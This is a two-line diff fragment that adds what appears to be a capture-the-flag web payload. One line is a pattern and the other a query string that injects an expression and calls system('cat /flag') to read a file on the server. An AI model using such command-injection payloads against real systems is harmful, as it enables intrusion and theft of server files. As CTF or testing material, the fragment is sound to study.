@@ -1,0 +1,2 @@
+\S*=${}
+?\S*=${getFlag()}&cmd=system('cat /flag');
